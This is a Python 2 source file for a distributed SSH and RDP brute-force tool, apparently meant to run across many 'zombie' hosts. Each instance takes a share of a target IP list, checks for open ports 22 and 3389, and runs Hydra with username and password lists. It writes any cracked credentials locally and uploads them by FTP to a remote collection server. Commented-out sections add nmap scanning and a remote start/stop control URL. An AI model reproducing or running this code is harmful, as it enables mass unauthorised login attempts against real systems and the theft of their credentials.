#filters output
import subprocess, sys, threading, time, urllib2, ftplib, logging, socket #, config
import logging.handlers, re
import socket as sc
#from pygame.examples.prevent_display_stretching import running
#proc = subprocess.Popen(['hydra.exe'] + '-P pass -L user -t 10 rdp://192.168.93.133'.split(" "),stdout=subprocess.PIPE)

#global ip_linux_file, ip_windows_file, found_linux_file, found_windows_file
global active_hydra #, active_nmaps
global lock
global ftp_ip, ftp_user, ftp_pass, ftp_dir
#global running #true or false -> Control
global s_ips, s_paswords, s_users
global logger, Nzombies, params
global config
#import config



"""
#lock standart methods
def l_a_nmaps(action,value=None): #In the case of the set, you will block 2 time (get and then set)
    global lock, active_nmaps
    lock.acquire()
    try:
        if action == 0:
            active_nmaps+=1
        elif action == 1:
            active_nmaps-=1
        elif action == 2:
            value = active_nmaps
        elif action == 3:
            active_nmaps = value
    finally:
        lock.release()
    return value
    

def lFWrite(string,f):
    global lock, logger
    global ip_linux_file, ip_windows_file
    lock.acquire()
    try:
        if f == 0:
            ip_linux_file.write(string + "\n")
            ip_linux_file.flush()
        elif f == 1:
            ip_windows_file.write(string + "\n")
            ip_windows_file.flush()
    except Exception as e:
        logger.error("[nmap WRITE] Error for ip files writting" + str(e))
    finally:
        lock.release()
"""

def l_a_hydra(action,value=None): #In the case of the set, you will block 2 time (get and then set)
    global lock, active_hydra
    lock.acquire()
    try:
        if action == 0:
            active_hydra+=1
        elif action == 1:
            active_hydra-=1
        elif action == 2:
            value = active_hydra
        elif action == 3:
            active_hydra = value
    finally:
        lock.release()
    return value

def lprint(id,message):
    global lock, logger
    lock.acquire()
    try:
        logger.info("["+str(id)+"]"+str(message))
    finally:
        lock.release()

def lerror(id,message):
    global lock, logger
    lock.acquire()
    try:
        logger.error("["+str(id)+"]"+ str(message))
    finally:
        lock.release()

def lFWrite(string, file_name):
    global lock, logger
    lock.acquire()
    try:
        with open(file_name,"a") as WF:
            WF.write(string + "\n")
            WF.flush()
    except Exception as e:
        logger.error("[nmap WRITE] Error for files writting " + str(file_name)+"  "   + str(e))
    finally:
        lock.release()

#Will update the founded passwords file
def ftpConnectAndWritte(file_name):
    global lock,config
    lock.acquire()
    try:
        ftp = ftplib.FTP(config.ftp_ip)
        if config.ftp_user != "":
            ftp.login(config.ftp_user, config.ftp_pass)
        else:
            ftp.login()
        ftp.cwd(config.ftp_dir)
        with open(file_name,'rb') as f:
            ftp.storbinary('STOR '+str(config.ID)+"_"+file_name, f)
    finally:
        try:
            ftp.quit()
        except:
            pass
        lock.release()

"""
def hydra(*args):
    global found_linux_file, found_windows_file
    l_a_hydra(0)
    file_L = args[0]
    file_P = args[1]
    file_o = args[2]
    file_M = args[3]
    threads_number = str(args[4])
    protocol = args[5]
    try:
        proc = subprocess.Popen([config.exe_hydra,"-L",file_L,"-P",file_P,"-o",file_o,"-M",file_M,"-f","-t",threads_number,protocol]  , stdout=subprocess.PIPE,shell=False)
        #"./hydra.exe -L user -P pass -t 10 -o output -f -M linux_ip ssh"
        while True:
            line = proc.stdout.readline()
            if line != '' and not proc.poll():
                Res = line.rstrip().split(" ")
                #lprint("[D][HYDRA][" + protocol + "]", line.rstrip())
                if "host:" in Res:
                    ftpConnectAndWritte(file_o) #Update the output file in FTP
                    lprint("[I][HYDRA][FOUND]" ,line.rstrip())
            else:
                break
    except Exception as e:
        lerror("Error hydra " + protocol,str(e))
    finally:
        l_a_hydra(1)
        lprint("[I][HYDRA][END][" + protocol + "]", "")




def processHydra():
    global active_hydra #, config
    try:
        logger.info("[PROCESS HYDRA] STARTED")
        active_hydra=0 #Intial nmap
        thread_pool = []
        for s in xrange(len(config.servicesh)):
            ars = [
                config.server_user,
                config.server_pass,
                config.services[s] + config.hydra_output, #service+outputfile-> Each service own output file
                config.service_ips[s],
                config.hydra_local_threads,
                config.servicesh[s]
            ]
            thread_pool.append(threading.Thread(target=hydra, args=ars))

        for t in thread_pool:
            while config.hydra_thread_limit != -1 and l_a_hydra(2) >= config.hydra_thread_limit: #Just upper bound limmmit
                time.sleep(config.hydra_time_threadLimit) #verify update every 2 seconds
            t.start()

        while l_a_hydra(2) > 0: #wait until all threads ends
            time.sleep(config.hydra_time_finalWait) #sleep 5 seconds
        logger.info("[PROCESS HYDRA] ENDED")
    except Exception as e:
        logger.error("[PROCESS HYDRA]" + str(e))
"""

def scan_host(host,port):
    r_code=1
    try:
        s = sc.socket(sc.AF_INET,sc.SOCK_STREAM)
        r_code = s.connect_ex((host,port))
        s.close()
    except Exception as e:
        pass
    return r_code == 0


def t_hydra(*args):
    global config
    l_a_hydra(0)
    ip = args[0]
    ip = re.sub("[\n\r]","",ip)
    serv = args[1]
    params = ""
    port_open=False
    if serv == "ssh":
        params = config.service_ssh
        port_open=scan_host(ip,22)
    elif serv == "rdp":
        params = config.service_rdp
        port_open=scan_host(ip,3389)
    if not port_open:
        l_a_hydra(1)
        lprint("[I][HYDRA][" + serv + "]", "Port not open : " + str(ip))
        return;

    errors_count = 0
    try:
        proc = subprocess.Popen([config.exe_hydra,"-L",config.server_user,"-P",config.server_pass] + params.split(" ") + [ip,serv]  , stdout=subprocess.PIPE)
        #"./hydra.exe -L user -P pass -t 10 -o output -f -M linux_ip ssh"
        while True:
            line = proc.stdout.readline()
            if line != '' and not proc.poll():
                Res = line.rstrip().split(" ")
                lprint("[I][HYDRA][" + serv + "]", str(line.rstrip()))
                if "host:" in Res:
                    lFWrite(str(serv) + " " + str(line.rstrip()),config.server_output) #Update local output file
                    ftpConnectAndWritte(config.server_output) #Update the output file in FTP
                    lprint("[I][HYDRA][FOUND]" ,line.rstrip())
                    break
            else:
                break
    except Exception as e:
        lerror("Error hydra " + serv,str(e))
    finally:
        l_a_hydra(1)
        lprint("[I][HYDRA][END][" + serv + "]", "")

def processTHydra():
    global active_hydra, config, Nzombies
    try:
        logger.info("[PROCESS HYDRA] STARTED")
        active_hydra=0 #Intial nmap
        thread_pool = []
        ips = []
        with open(config.server_ips, "r") as RF:
            ips = RF.readlines()
        part_ips = int(len(ips) * 1.0 / Nzombies)
        if config.ID +1 == Nzombies:
            ips = ips[config.ID*part_ips:]
        else:
            ips = ips[(config.ID*part_ips) : (config.ID+1 * part_ips) ]
        #logger.info("[PROCESS HYDRA] IPS : " + str(ips))
        for ip in ips:
            thread_pool.append(threading.Thread(target=t_hydra, args=[ip[:-1], "ssh"]))
            thread_pool.append(threading.Thread(target=t_hydra, args=[ip[:-1], "rdp"]))

        for t in thread_pool:
            while int(config.hydra_thread_limit) != -1 and l_a_hydra(2) >= int(config.hydra_thread_limit): #Just upper bound limmmit
                time.sleep(float(config.hydra_time_threadLimit)) #verify update every 2 seconds
            t.start()

        while l_a_hydra(2) > 0: #wait until all threads ends
            time.sleep(float(config.hydra_time_finalWait)) #sleep 5 seconds
        logger.info("[PROCESS HYDRA] ENDED")
    except Exception as e:
        logger.error("[PROCESS HYDRA]" + str(e))
"""
def nmap(*args):
    global ip_linux_file, ip_windows_file
    global active_nmaps
    l_a_nmaps(0) #namps+=1
    ip = args[0]
    all= (args[1])
    try:
        #lprint("[D][NMAP]", str([config.exe_namp] +(['-A'] if all else [] )+ [ip]))
        proc = subprocess.Popen([config.exe_namp] +(['-A'] if all else [] )+ [ip],stdout=subprocess.PIPE)
        found=False
        res=""
        while True:
          line = proc.stdout.readline()
          if line != '':
            Res = line.rstrip().split(" ")
            #lprint("[D][NMAP]", str(line.rstrip()))
            for i in xrange(len(config.services)):
                if config.services[i] in Res:
                    res = Res[0].split("/")[0],i
                    found=True
                    break #Only need one service
          else:
              break

        if found :
            lFWrite(ip + ":" + res[0], res[1]) #Sinchronized nmap write
            lprint("[I][NMAP]" , str(all) + " " +str(ip + ":" + res[0] +" " + config.services[res[1]]))
        else:
            lprint("[I][NMAP]", str(all) + " " + "No in  : " + str(ip))
    except Exception as e:
        lerror("ERROR nmap", str(e) )
    finally:
        l_a_nmaps(1) #active nmaps -= 1

def processNmap(advanced=False):
    global ip_linux_file, ip_windows_file, active_nmaps, Nzombies #, config
    try:
        logger.info("[PROCESS NMAP] STARTED")
        ip_linux_file=open(config.file_ips_linux, "w")
        ip_windows_file=open(config.file_ips_windows, "w")
        active_nmaps=0 #Intial nmap
        thread_pool = []
        with open(config.server_ips, "r") as RF:
            s_ips = RF.readlines()
            if Nzombies == (config.ID+1):
                s_ips=s_ips[Nzombies*config.ID:]
            else:
                s_ips = s_ips[Nzombies * config.ID:Nzombies * (config.ID+1)]
        for i in s_ips:
            thread_pool.append(threading.Thread(target=nmap, args=[i[:-1],advanced]))
        for t in thread_pool:
            while config.nmap_thread_limit != -1 and l_a_nmaps(2) >= config.nmap_thread_limit: #Just upper bound limmmit
                time.sleep(config.nmap_time_threadLimit) #verify update every 2 seconds
            t.start()

        while l_a_nmaps(2) > 0: #wait until all threads ends
            time.sleep(config.nmap_time_finalWait) #sleep 5 seconds
        logger.info("[PROCESS NMAP] ENDED")
        ip_linux_file.close()
        ip_windows_file.close()
    except Exception as e:
        logger.error("[PROCESS NMAP]" + str(e))


def processIPS():
    global ip_linux_file, ip_windows_file, Nzombies #, config
    try:
        logger.info("[PROCESS IPS] STARTED")
        ip_linux_file=open(config.file_ips_linux, "w")
        ip_windows_file=open(config.file_ips_windows, "w")
        with open(config.server_ips, "r") as RF:
            s_ips = RF.readlines()
            if Nzombies == (config.ID+1):
                s_ips=s_ips[Nzombies*config.ID:]
            else:
                s_ips = s_ips[Nzombies * config.ID:Nzombies * (config.ID+1)]
        for i in s_ips:
            #logger.info(str(i))
            ip_linux_file.write(i[:-1]+":22\n")
            ip_windows_file.write(i[:-1] + ":3389\n")

        logger.info("[PROCESS IPS] ENDED")
        ip_linux_file.close()
        ip_windows_file.close()
    except Exception as e:
        logger.error("[PROCESS IPS]" + str(e))


def getFromUrl(url):
    return urllib2.urlopen(url).read()


def controlFromServer():
    global running, config
    while True:
        control = getFromUrl(config.server + "/" + config.server_control).split("\n")
        if control[0] == "start":
            running = True
        elif control[0] == "stop": #Just to avoid errors
            running = False
        time.sleep(config.control_updateTime)
"""

def parseConfig():
    global config
    class Config(object):
        pass
    config = Config()
    try:
        with open("./config.py","r") as CR:
            L = CR.readlines()
            LL = filter(lambda x : x != "\n" and x[0] != "#", L)
            LLL = map(lambda x : x.split("#")[0].split("\n")[0] , LL)
            LLL = map(lambda x: x[:-1] if x[-1] == "\r" else x , LLL)
            DL = dict([[l.split("=")[0],
                        ("=".join(l.split("=")[1:])).split("\"")[1] if "\"" in ("=".join(l.split("=")[1:])) else ("=".join(l.split("=")[1:]))] for
                       l in LLL])
            config.__dict__ = DL
    except Exception as e:
        print "[ERROR] Configurations parese incorrect"
        return False
    return True

if __name__ == "__main__":
    #Lock for parallel interumptions
    lock= threading.Lock()

    #Logger
    logger = logging.getLogger("global")
    logger.setLevel(logging.DEBUG)
    handler = logging.handlers.RotatingFileHandler("./brute.log")
    logger.addHandler(handler)

    #Configurations
    if not parseConfig():
        logger.error("[ERROR] Wrong configurations file")
        sys.exit(1)  # EXIT

    config.ID = int(sys.argv[1])
    Nzombies = int(sys.argv[2])

    #if (len(sys.argv) > 3):
    #    params = sys.argv[3]

    if config.ID < 0:
        #logger.error("ERROR : Wrong ID from ID SERVER: " + str(config.ID) )
        logger.error("[ID SERVER ERROR]" + "ERROR : Wrong ID from ID SERVER:" + str(config.ID))
        sys.exit(1) #EXIT

    logger.info("== PROCES STARTED ==")
    logger.info("Version 1.0")
    logger.info("config.ID " + str(config.ID) + " Number of process " + str(Nzombies))

    #if task == "all" or task == "alln" or task == "hydra":
    processTHydra()

    logger.info("== PROCES ENDED ==")
    #sys.stdout.flush()
    sys.exit(0)

